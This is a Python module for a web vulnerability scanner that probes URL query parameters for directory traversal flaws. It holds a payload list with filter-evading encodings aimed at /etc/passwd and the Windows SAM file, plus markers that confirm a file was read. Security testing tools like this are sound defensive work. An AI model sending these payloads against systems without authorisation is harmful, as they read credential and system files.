import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .base import BaseScanner, ScanResult, Finding, Severity

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
]

TRAVERSAL_MARKERS = [
    "root:x:0:0",
    "[boot loader]",
    "root:*:0:0",
]

class TraversalScanner(BaseScanner):
    name = "traversal"
    description = "Detect Directory Traversal vulnerabilities"

    def scan(self, target: str, **kwargs) -> ScanResult:
        result = ScanResult(scanner_name=self.name, target=target)
        urls = self._get_test_urls(target)

        for url in urls:
            for param in parse_qs(urlparse(url).query):
                for payload in TRAVERSAL_PAYLOADS:
                    try:
                        test_url = self._inject_param(url, param, payload)
                        response = requests.get(test_url, timeout=10, verify=False)
                        if any(marker in response.text for marker in TRAVERSAL_MARKERS):
                            finding = Finding(
                                title=f"Directory Traversal in parameter '{param}'",
                                severity=Severity.HIGH,
                                description=f"Parameter '{param}' allows directory traversal",
                                evidence=f"Payload: {payload}",
                                recommendation="Validate and sanitize file paths",
                                metadata={"url": url, "param": param, "payload": payload}
                            )
                            result.findings.append(finding)
                            break
                    except requests.RequestException:
                        continue

        return result

    def _get_test_urls(self, target: str) -> list:
        urls = []
        if "?" in target:
            urls.append(target)
        else:
            urls.append(f"{target}/?file=test.txt")
            urls.append(f"{target}/?page=home")
            urls.append(f"{target}/?include=header")
        return urls

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
